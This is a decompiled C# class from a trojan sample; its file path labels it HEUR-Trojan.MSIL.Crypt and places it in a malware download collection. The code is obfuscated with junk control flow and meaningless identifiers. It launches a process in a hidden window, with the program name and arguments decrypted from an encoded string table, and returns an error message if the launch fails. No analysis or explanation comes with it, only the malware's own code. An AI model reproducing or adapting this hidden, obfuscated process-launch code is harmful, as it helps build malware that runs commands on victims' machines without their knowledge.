// Decompiled with JetBrains decompiler
// Type: @Ӿ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ӿ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string RJy() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int a52() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ӿ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    int num1;
    if (!\u0040Ӿ.\u0040ӟ())
    {
      num1 = 2;
      goto label_7;
    }
    else
    {
      num1 = 3;
      if (\u0040Ӿ.\u0040Ӟ())
        goto label_7;
    }
label_6:
    \u0040Ӿ.\u0040Ӗ((object) this);
    goto label_9;
label_7:
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 2:
          goto label_3;
        case 1:
        case 3:
          goto label_6;
        case 4:
          goto label_9;
        default:
          int num2 = 4;
          num1 = \u0040Ӿ.\u0040ӟ() ? num2 : num2;
          continue;
      }
    }
label_3:
    \u0040Ӿ.\u0040ӕ();
    goto label_6;
label_9:
    try
    {
      ProcessStartInfo processStartInfo = new ProcessStartInfo();
      \u0040Ӿ.\u0040ӗ((object) processStartInfo, true);
      \u0040Ӿ.\u0040ә((object) processStartInfo, \u0040Ӿ.\u0040Ә(2914));
      \u0040Ӿ.\u0040Ӛ((object) processStartInfo, \u0040Ӿ.\u0040Ә(2970));
      \u0040Ӿ.\u0040ӛ((object) processStartInfo, ProcessWindowStyle.Hidden);
      \u0040Ӿ.\u0040Ӝ((object) processStartInfo);
      \u0040Ӿ.\u0040ӟ();
      switch (!\u0040Ӿ.\u0040Ӟ() ? 3 : 2)
      {
        case 0:
        case 2:
          this.\u0040Ӕ = 0;
          break;
      }
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ӿ.\u0040ӝ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӗ(object _param0, bool _param1) => ((ProcessStartInfo) _param0).UseShellExecute = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ә(object _param0, object _param1) => ((ProcessStartInfo) _param0).FileName = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӛ(object _param0, object _param1) => ((ProcessStartInfo) _param0).Arguments = (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӛ(object _param0, ProcessWindowStyle _param1) => ((ProcessStartInfo) _param0).WindowStyle = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0) => (object) Process.Start((ProcessStartInfo) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӟ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӟ() => false;
}
